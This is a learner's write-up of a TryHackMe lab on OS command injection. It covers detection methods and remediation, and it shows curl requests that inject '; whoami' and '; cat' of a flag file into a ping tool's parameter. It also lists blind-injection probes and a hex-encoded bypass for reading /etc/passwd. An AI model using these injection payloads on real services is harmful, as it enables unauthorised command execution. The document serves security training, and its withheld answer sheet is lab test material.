# Command Injection (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities II (room 4)
- **Completed:** 2026-10-10 - **Target:** ACKme DiagnoseIT @ <ip> (over VPN)

Command injection = user input flows into a system-call function (PHP exec/system/shell_exec/
passthru, Python subprocess, Node child_process.exec) without validation, so you chain extra OS
commands. Runs with the app's privileges. OWASP A05 Injection / CWE-78. One technique for RCE.

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 2 | Variable storing input (PHP) | *(find it yourself)* |
| 2 | HTTP method retrieving data (PHP) | *(find it yourself)* |
| 2 | Route to run id (Python) | *(find it yourself)* |
| 3 | Payload for the running user | *(find it yourself)* |
| 3 | Linux blind-CI network tool | *(find it yourself)* |
| 3 | Windows blind-CI test payload | *(find it yourself)* |
| 4 | User the app runs as | *(find it yourself)* |
| 4 | Flag /home/tryhackme/flag.txt | THM{…} |
| 5 | Term for cleaning user input | *(find it yourself)* |

## Detection
- Verbose CI: injected command's output shows in the response (inject ; whoami).
- Blind CI: no output; use side effects:
  - time delay: ; ping -c 10 127.0.0.1  or  ; sleep 10  (Windows: timeout) -> response hangs.
  - file write: ; whoami > /var/www/html/out.txt then browse /out.txt.
  - OOB: callback to a server you control.
- Shell operators to chain: ; (sequential), & , && , | , newline, $(...) / backticks.

## Practical - ACKme DiagnoseIT
Ping tool: GET index.php?address=<ip>, runs ping <address> and reflects output (verbose).
```
curl -s -G http://<ip>/index.php --data-urlencode "address=127.0.0.1; whoami"
   -> www-data
curl -s -G http://<ip>/index.php --data-urlencode "address=127.0.0.1; cat /home/tryhackme/flag.txt"
   -> THM{…}
```
The `;` turns `ping 127.0.0.1; cat ...` into two commands. Other operators (&&, |, newline) work too.

## Remediation (Task 5)
- Avoid shell-exec functions; use safe APIs that pass args as an array (no shell), e.g. PHP
  escapeshellarg/escapeshellcmd, Python subprocess with a list + shell=False.
- Server-side input validation/sanitisation (allowlist expected format, e.g. numeric/IP only);
  client-side HTML pattern is bypassable (curl/Burp send raw). filter_input / FILTER_VALIDATE_*.
- Filters can be bypassed (e.g. hex-encoded strings \x2f\x65... = /etc/passwd), so defence in depth:
  validation + sanitisation + allowlist + least privilege.
